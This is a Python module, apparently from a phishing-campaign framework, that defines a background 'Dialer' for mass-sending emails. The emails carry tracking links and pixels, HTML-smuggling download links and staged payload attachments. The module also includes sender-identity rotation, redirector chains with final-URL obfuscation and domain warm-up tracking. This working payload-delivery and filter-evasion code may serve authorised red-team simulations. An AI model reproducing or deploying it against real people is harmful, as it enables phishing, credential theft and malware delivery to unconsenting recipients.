import os
import random
import time
from datetime import datetime
from threading import Thread, Event as ThreadEvent

from flask import current_app

from .canary import get_canary_embeds
from .clean_urls import build_clean_url
from .mailer import Mailer
from .enterprise_mailer import EnterpriseMailer
from .renderer import render_email
from .throttle import SlidingWindowThrottle
from .validator import sign_token
from .html_smuggler import encode_payload
from .payload_staging import get_payload_content
from .sender_rotation import get_next_identity, build_identity_for_entry
from .domain_reputation import record_domain_send
from .redirectors import (
    wrap_campaign_link,
    get_campaign_redirector_templates,
    filter_healthy_redirector_templates,
)
from .domain_routing import get_recipient_proxy_url
from .ab_testing import ensure_recipient_variant, variant_html
from .qr_codes import build_recipient_qr_img


def _envelope_sender(sub) -> str:
    """Return the MAIL FROM address for a subsidiary.

    The bounce subdomain field takes either a full domain (bounce.example.com) or
    a single label that sits in front of the sending domain (bounce becomes
    bounce.cyberd0me.ng). The old code interpolated the label straight after the
    @, producing "bounce@bounce": not an address, an SPF check against a domain
    that does not exist, and DSNs delivered nowhere.
    """
    domain = (getattr(sub, "sending_domain", "") or "").strip()
    label = (getattr(sub, "bounce_subdomain", "") or "").strip().strip(".")
    if label:
        domain = label if "." in label else (f"{label}.{domain}" if domain else label)
    if domain:
        return f"bounce@{domain}"
    return getattr(sub, "from_address", "") or ""


def create_mailer(profile_kwargs: dict, pool_size: int, use_enterprise: bool = False):
    """Return a mailer instance using either the standard or enterprise sender."""
    if use_enterprise:
        return EnterpriseMailer(
            smtp_host=profile_kwargs['smtp_host'],
            smtp_port=profile_kwargs.get('smtp_port') or 25,
            smtp_user=profile_kwargs.get('smtp_user'),
            smtp_pass=profile_kwargs.get('smtp_pass'),
            use_tls=profile_kwargs.get('use_tls', True),
            pool_size=pool_size,
            dkim_selector=profile_kwargs.get('dkim_selector'),
            dkim_domain=profile_kwargs.get('dkim_domain'),
            dkim_private_key=profile_kwargs.get('dkim_private_key'),
            rate_limit_per_minute=max(1, int(60.0 / max(1, pool_size))),
        )
    return Mailer(pool_size=pool_size, **profile_kwargs)


class Dialer:
    """Background campaign sender with job tracking and provider throttling.

    Each Dialer instance owns one campaign job.  The send loop runs in a
    daemon thread so the HTTP request returns immediately and the admin
    dashboard can poll progress via CampaignJob.
    """

    _active_jobs: dict[int, 'Dialer'] = {}

    def __init__(self, db, rate_per_min=60, pool_size=None):
        from dropoutjeep_lib.utils.settings import get_setting_int
        self.db = db
        self.rate_per_min = rate_per_min
        self.pool_size = int(pool_size if pool_size is not None
                             else get_setting_int('dialer_pool_size', 2))
        self._stop = ThreadEvent()
        self.job_id: int | None = None
        self.campaign_id: int | None = None
        self.app = current_app._get_current_object() if current_app else None
        self._healthy_redirector_templates: list[str] | None = None
        self._obfuscate_final: bool = False

    @classmethod
    def stop_campaign(cls, campaign_id: int):
        dialer = cls._active_jobs.pop(campaign_id, None)
        if dialer:
            dialer._stop.set()
            return True
        return False

    def _mark_job(self, status, sent=None, failed=None,
                  completed_at=None, commit=True):
        from dropoutjeep_lib.models import CampaignJob
        job = CampaignJob.query.get(self.job_id)
        if not job:
            return
        job.status = status
        if sent is not None:
            job.sent = sent
        if failed is not None:
            job.failed = failed
        if completed_at:
            job.completed_at = completed_at
        self.db.session.add(job)
        if commit:
            self.db.session.commit()

    def _send_batch(self, campaign_id, recipient_ids):
        if self.app:
            with self.app.app_context():
                self._send_batch_impl(campaign_id, recipient_ids)
        else:
            self._send_batch_impl(campaign_id, recipient_ids)

    def _send_batch_impl(self, campaign_id, recipient_ids):
        from dropoutjeep_lib.models import Event, CampaignJob, RateProfile, Recipient, Campaign, Subsidiary, Payload

        # Re-load campaign and recipients inside the worker session to avoid
        # cross-thread detached-instance errors.
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            return
        recipients = Recipient.query.filter(Recipient.id.in_(recipient_ids)) \
            .order_by(Recipient.id).all()

        staged_payloads = Payload.query.filter_by(campaign_id=campaign.id).all()

        sp = campaign.sending_profile

        # Sender rotation setup
        rotation_pool_id = campaign.sender_rotation_pool_id
        rotation_index = 0
        if rotation_pool_id:
            job = CampaignJob.query.get(self.job_id)
            if job:
                rotation_index = job.rotation_index or 0

        from dropoutjeep_lib.utils.settings import get_setting_bool
        use_enterprise = bool(campaign.use_enterprise_mailer or
                              get_setting_bool('use_enterprise_mailer', False))

        # Default single-identity mailer
        default_mailer = None
        if not rotation_pool_id and sp:
            profile_kwargs = {
                'smtp_host': sp.smtp_host,
                'smtp_port': sp.smtp_port or 25,
                'smtp_user': sp.smtp_user,
                'smtp_pass': sp.get_smtp_pass(),
                'use_tls': sp.use_tls,
                'dkim_selector': sp.subsidiary.dkim_selector if sp.subsidiary else None,
                'dkim_domain': sp.subsidiary.sending_domain if sp.subsidiary else None,
                'dkim_private_key': sp.subsidiary.get_dkim_private_key() if sp.subsidiary else None,
            }
            default_mailer = create_mailer(profile_kwargs, self.pool_size, use_enterprise)

        # Cache mailers when rotating to avoid reconnecting every email.
        mailer_cache: dict[int, Mailer] = {}

        # Resolve provider-aware rate profile and build throttle.
        rate_profile = sp.resolve_rate_profile() if sp else None
        if rate_profile:
            throttle = SlidingWindowThrottle(
                max_per_hour=rate_profile.hourly_limit,
                max_per_day=rate_profile.daily_limit,
                max_per_month=rate_profile.monthly_limit,
            )
            delay_min = rate_profile.delay_ms_min / 1000.0
            delay_max = rate_profile.delay_ms_max / 1000.0
        else:
            throttle = None
            delay_min = delay_max = 60.0 / max(1, self.rate_per_min)

        from dropoutjeep_lib.utils.settings import get_base_url
        base_url = getattr(campaign, 'base_url', None) or get_base_url()
        sent = failed = 0
        total = len(recipients)

        self._mark_job('running', sent=0, failed=0, commit=True)

        try:
            for idx, recipient in enumerate(recipients):
                if self._stop.is_set():
                    self._mark_job('stopped', sent=sent, failed=failed,
                                   completed_at=datetime.utcnow())
                    return

                try:
                    token = recipient.token
                    variant_key = ensure_recipient_variant(recipient)
                    body_html, landing_html = variant_html(campaign, variant_key)

                    sig = sign_token(token)
                    track_link = wrap_campaign_link(
                        f"{base_url}/track/{token}?sig={sig}", campaign,
                        templates=self._healthy_redirector_templates,
                        obfuscate_final=self._obfuscate_final,
                    )
                    pixel = f"{base_url}/pixel/{token}"
                    calendar_link = wrap_campaign_link(
                        f"{base_url}/calendar/{token}.ics", campaign,
                        templates=self._healthy_redirector_templates,
                        obfuscate_final=self._obfuscate_final,
                    )
                    proxy_link = wrap_campaign_link(
                        get_recipient_proxy_url(campaign.id, token, base_url),
                        campaign,
                        templates=self._healthy_redirector_templates,
                        obfuscate_final=self._obfuscate_final,
                    )
                    canary_embeds = get_canary_embeds(campaign.id, base_url)

                    # HTML smuggling link
                    smuggle_link = None
                    payload_b64 = campaign.get_html_smuggling_payload()
                    if campaign.html_smuggling_enabled and payload_b64:
                        smuggle_link = wrap_campaign_link(
                            f"{base_url}/drop/{token}?sig={sig}", campaign,
                            templates=self._healthy_redirector_templates,
                            obfuscate_final=self._obfuscate_final,
                        )

                    unsubscribe_link = wrap_campaign_link(
                        f"{base_url}/unsubscribe/{token}?sig={sig}", campaign,
                        templates=self._healthy_redirector_templates,
                        obfuscate_final=self._obfuscate_final,
                    )

                    render_ctx = {
                        'recipient': recipient,
                        'campaign': campaign,
                        'TOKEN': token,
                        'TRACK_LINK': track_link,
                        'UNSUBSCRIBE_LINK': unsubscribe_link,
                        'UNSUBSCRIBE_URL': unsubscribe_link,
                        'CLEAN_URL': build_clean_url(base_url, token),
                        'PROXY_LINK': proxy_link,
                        'CALENDAR_LINK': calendar_link,
                        'PIXEL': f'<img src="{pixel}" width="1" height="1" />',
                        'VARIANT_KEY': variant_key,
                        **canary_embeds,
                    }
                    if smuggle_link:
                        render_ctx['HTML_SMUGGLE_LINK'] = smuggle_link

                    if campaign.get_flow_config().get('qr_code_enabled'):
                        render_ctx['QR_CODE'] = build_recipient_qr_img(campaign, recipient, base_url)

                    html = render_email(body_html or campaign.template_html, render_ctx)

                    # Pick identity (rotated or default)
                    if rotation_pool_id:
                        entry, rotation_index = get_next_identity(rotation_pool_id, rotation_index)
                        if not entry:
                            raise RuntimeError("Sender rotation pool has no entries")
                        envelope_from, from_header, reply_to, mailer_kwargs = build_identity_for_entry(entry)
                        sp_id = entry.sending_profile_id
                        if sp_id not in mailer_cache:
                            mailer_cache[sp_id] = create_mailer(
                                mailer_kwargs, self.pool_size, use_enterprise
                            )
                        mailer = mailer_cache[sp_id]
                        sub_for_warmup = entry.subsidiary or (entry.sending_profile.subsidiary if entry.sending_profile else None)
                    else:
                        mailer = default_mailer
                        envelope_from = _envelope_sender(sp.subsidiary) \
                            if sp and sp.subsidiary else campaign.envelope_from
                        from_header = f"{sp.subsidiary.display_name} <{sp.subsidiary.from_address}>" \
                            if sp and sp.subsidiary else envelope_from
                        # Replies are signal. Send them to the mailbox we actually
                        # read, not to a hardcoded security@ that may not exist.
                        reply_to = sp.subsidiary.from_address if sp and sp.subsidiary else None
                        sub_for_warmup = sp.subsidiary if sp else None

                    ics_event = None
                    if campaign.calendar_invite and campaign.calendar_event_start and campaign.calendar_event_end:
                        ics_event = {
                            'title': campaign.calendar_event_title or 'Security Briefing',
                            'start': campaign.calendar_event_start,
                            'end': campaign.calendar_event_end,
                            'location': campaign.calendar_event_location or 'Conference Room A',
                            'description': f"Add this event to your calendar.\n\n{calendar_link}"
                        }

                    attachments = None
                    if staged_payloads:
                        attachments = [
                            {
                                'filename': p.filename,
                                'content': get_payload_content(p, token),
                                'mime_type': p.mime_type,
                            }
                            for p in staged_payloads
                        ]

                    mailer.send(
                        envelope_from=envelope_from,
                        to_addr=recipient.email,
                        subject=campaign.subject,
                        html_body=html,
                        from_header=from_header,
                        reply_to=reply_to,
                        ics_event=ics_event,
                        attachments=attachments,
                    )
                    recipient.sent_at = datetime.utcnow()
                    self.db.session.add(recipient)
                    self.db.session.add(Event(
                        campaign_id=campaign.id,
                        recipient_id=recipient.id,
                        event_type='sent'
                    ))
                    self.db.session.commit()

                    # Persist rotation progress
                    if rotation_pool_id:
                        job = CampaignJob.query.get(self.job_id)
                        if job:
                            job.rotation_index = rotation_index
                            self.db.session.add(job)
                            self.db.session.commit()

                    # Track domain warmup volume
                    if sub_for_warmup:
                        record_domain_send(sub_for_warmup, count=1)

                    from dropoutjeep_lib.utils.live import push_event
                    push_event('sent', campaign_id=campaign.id, recipient_id=recipient.id)
                    sent += 1
                except Exception as e:
                    self.db.session.rollback()
                    self.db.session.add(Event(
                        campaign_id=campaign.id,
                        recipient_id=recipient.id,
                        event_type='send_failed',
                        meta=str(e)[:512]
                    ))
                    self.db.session.commit()
                    from dropoutjeep_lib.utils.live import push_event
                    push_event('send_failed', campaign_id=campaign.id, recipient_id=recipient.id, meta=str(e)[:512])
                    failed += 1
                    print(f"[Dialer] send failed for {recipient.email}: {e}")

                # Update job progress every recipient.
                self._mark_job('running', sent=sent, failed=failed, commit=True)

                if throttle:
                    throttle.acquire()
                else:
                    sleep_time = delay_max if delay_min == delay_max else random.uniform(delay_min, delay_max)
                    time.sleep(sleep_time)

            self._mark_job('completed', sent=sent, failed=failed,
                           completed_at=datetime.utcnow())
        finally:
            if default_mailer:
                default_mailer.close()
            for m in mailer_cache.values():
                m.close()
            Dialer._active_jobs.pop(self.campaign_id, None)

    def start_campaign(self, campaign_id, rate_per_min=None):
        if rate_per_min:
            self.rate_per_min = rate_per_min

        from dropoutjeep_lib.models import Campaign, Recipient, CampaignJob
        from dropoutjeep_lib.utils.domain_routing import ensure_wildcard_domain_provisioned
        campaign = Campaign.query.get(campaign_id)
        if not campaign:
            return False

        # Validate configured redirector chains before launch and drop dead hops.
        redirector_templates = get_campaign_redirector_templates(campaign)
        if redirector_templates:
            healthy = filter_healthy_redirector_templates(redirector_templates)
            for template in redirector_templates:
                if template not in healthy:
                    print(f"[Dialer] redirector unhealthy, skipping: {template}")
            if not healthy:
                print("[Dialer] all redirectors unhealthy; aborting campaign launch")
                return False
            self._healthy_redirector_templates = healthy
        self._obfuscate_final = bool(campaign.get_flow_config().get("obfuscate_final_url"))

        # Provision wildcard domain + TLS when configured.
        domain_ok, domain_msg = ensure_wildcard_domain_provisioned(campaign_id)
        if not domain_ok:
            print(f"[Dialer] domain provisioning failed: {domain_msg}")
            return False
        if domain_msg != "no wildcard domain configured":
            print(f"[Dialer] domain status: {domain_msg}")

        recipients = Recipient.query.filter_by(campaign_id=campaign_id, sent_at=None).all()
        if not recipients:
            return False

        # Create a fresh job record.
        job = CampaignJob(
            campaign_id=campaign_id,
            status='pending',
            total=len(recipients),
            sent=0,
            failed=0,
            started_at=datetime.utcnow()
        )
        self.db.session.add(job)
        self.db.session.commit()
        self.job_id = job.id
        self.campaign_id = campaign_id
        Dialer._active_jobs[campaign_id] = self

        recipient_ids = [r.id for r in recipients]
        t = Thread(target=self._send_batch, args=(campaign.id, recipient_ids), daemon=True)
        t.start()
        return True
